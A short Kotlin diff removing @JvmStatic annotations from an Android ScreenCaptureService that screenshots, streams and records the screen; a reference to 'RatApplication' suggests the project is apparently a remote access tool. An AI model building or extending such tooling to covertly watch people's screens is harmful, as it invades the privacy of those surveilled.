@@ -56,13 +56,13 @@ class ScreenCaptureService : Service() {
         private var screenHeight = 0
         private var screenDensity = 1f
 
-        @JvmStatic
+        
         fun requestScreenCapture(activity: Activity) {
             mediaProjectionManager = activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), 1004)
         }
 
-        @JvmStatic
+        
         fun setMediaProjectionResult(resultCode: Int, data: Intent) {
             val context = RatApplication.getInstance() ?: return
             mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
@@ -78,7 +78,7 @@ class ScreenCaptureService : Service() {
             Log.d(TAG, "Screen capture initialized: ${screenWidth}x${screenHeight}")
         }
 
-        @JvmStatic
+        
         fun captureScreenshot(context: Context): Map<String, Any> {
             return try {
                 if (mediaProjection == null) {
@@ -123,7 +123,7 @@ class ScreenCaptureService : Service() {
             }
         }
 
-        @JvmStatic
+        
         fun toggleScreenStream(enable: Boolean): Map<String, Any> {
             isStreaming = enable
             if (enable) {
@@ -179,7 +179,7 @@ class ScreenCaptureService : Service() {
             isStreaming = false
         }
 
-        @JvmStatic
+        
         fun recordScreen(context: Context, durationMs: Long = 30000): Map<String, Any> {
             return try {
                 if (mediaProjection == null) {
@@ -229,7 +229,7 @@ class ScreenCaptureService : Service() {
             }
         }
 
-        @JvmStatic
+        
         fun stopScreenRecording(): Map<String, Any> {
             return try {
                 if (!isRecording) {
